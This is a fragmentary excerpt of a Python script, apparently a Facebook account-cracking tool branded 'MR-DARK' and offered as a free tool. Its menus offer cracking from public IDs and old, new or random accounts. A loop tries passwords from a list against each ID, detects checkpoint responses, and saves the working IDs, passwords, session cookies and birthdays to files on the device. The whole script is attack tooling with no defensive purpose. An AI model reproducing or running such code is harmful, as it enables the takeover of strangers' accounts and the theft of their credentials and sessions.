...
Github : JISAN-404'''
	...
	cetak(nel(oi, title='[bold red] • FREE TOOL • [/bold red]'))
# VALIDASI TOKEN
def login():
...
#	pil=input('[•] Choose : ')
	...
	if pil in ['1','01']:
		try:
			cik='# LOGIN USING COOKIE [Use New Id]'
...
def menu(my_name,my_id):
	...
	io = '''[bold green][01] CRACK FROM PUBLIK ID	    
[00] LOGOUT[bold green]'''
	oi = nel(io, style='red')
	cetak(nel(oi, title='[bold cyan] • MAIN MENU • [/bold cyan]'))
...
def setting():
	...
	teks = '[01] CRACK OLD ACCOUNT\n[02] NEW ACCOUNT CRACK\n[03] RANDOM ACCOUNT CRACK'
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	guw = '# SHOWING CHECKPOINT OPTIONS ? (y/t)'
	...
	guw = '# SHOWING CEKPOIN RESULTS ? (y/t)'
...
#	ua='Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36'
	...
	sys.stdout.write('\r%s MR-DARK %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					try:
						...
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
						open('/sdcard/DARK-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/DARK-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='MR-DARK[OK]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					...
					if opsinya=='':
						try:
							open('/sdcard/DARK-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
						except:
							open('/sdcard/DARK-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
